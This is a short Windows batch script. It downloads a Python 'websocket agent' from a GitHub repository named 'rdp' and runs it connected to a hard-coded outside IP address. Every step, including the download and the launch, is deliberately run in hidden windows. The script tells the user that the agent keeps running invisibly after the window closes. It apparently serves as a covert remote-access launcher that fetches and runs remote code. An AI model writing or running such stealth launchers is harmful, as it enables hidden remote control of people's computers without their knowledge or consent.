@echo off
echo Starting WebSocket Agent in completely hidden mode...

REM Check if Python script exists, if not download it
if not exist "websocket_agent.py" (
    echo Downloading websocket_agent.py...
    powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/Pharaon3/rdp/main/websocket_agent.py' -OutFile 'websocket_agent.py'"
)

REM Install websockets package
echo Installing websockets package...
pip install websockets

REM Start the Python agent completely hidden using PowerShell
echo Starting Python agent completely hidden...
powershell -WindowStyle Hidden -Command "$process = Start-Process python -ArgumentList 'websocket_agent.py', '3.237.240.137', '3000', 'test' -WindowStyle Hidden -PassThru; Write-Output $process.Id"

echo Agent started successfully!
echo The Python agent is now running completely hidden.
echo No visible terminal window will be opened.
echo You can close this window and the agent will continue running.
pause 